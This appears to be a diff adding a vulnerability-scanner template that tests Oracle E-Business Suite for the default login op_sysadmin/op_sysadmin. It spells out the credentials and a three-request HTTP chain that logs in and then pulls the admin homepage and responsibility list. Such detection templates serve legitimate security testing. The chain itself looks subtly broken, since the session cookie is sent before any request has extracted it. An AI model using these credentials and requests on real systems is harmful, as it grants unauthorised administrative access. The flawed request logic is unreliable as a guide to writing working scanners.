@@ -1,0 +1,67 @@
+id: oracle-ebs-default-password
+
+info:
+  name: Oracle E-Business Suite Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Oracle E-Business Suite has a default password vulnerability. Attackers can log in to the platform with the default credentials (op_sysadmin/op_sysadmin) and use administrative privileges to perform core functions.
+  reference:
+    - https://cxsecurity.com/issue/WLB-2020030106
+  tags: default-password
+
+variables:
+  username: "op_sysadmin"
+  password: "op_sysadmin"
+
+http:
+  - raw:
+      - |
+        POST /OA_HTML/AppsLocalLogin.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "status: 'success'"
+
+  - raw:
+      - |
+        GET /OA_HTML/OA.jsp?OAFunc=OANEWHOMEPAGE HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{cookie}}
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        regex:
+          - "Set-Cookie: (.*?);"
+        internal: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "OANEWHOMEPAGE"
+
+  - raw:
+      - |
+        POST /OA_HTML/RF.jsp?function_id=MAINMENUREST&security_group_id=0 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Cookie: {{cookie}}
+
+        <params><param>RESPLIST</param><param>HOMEPAGE</param></params>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<RESPNAME>"
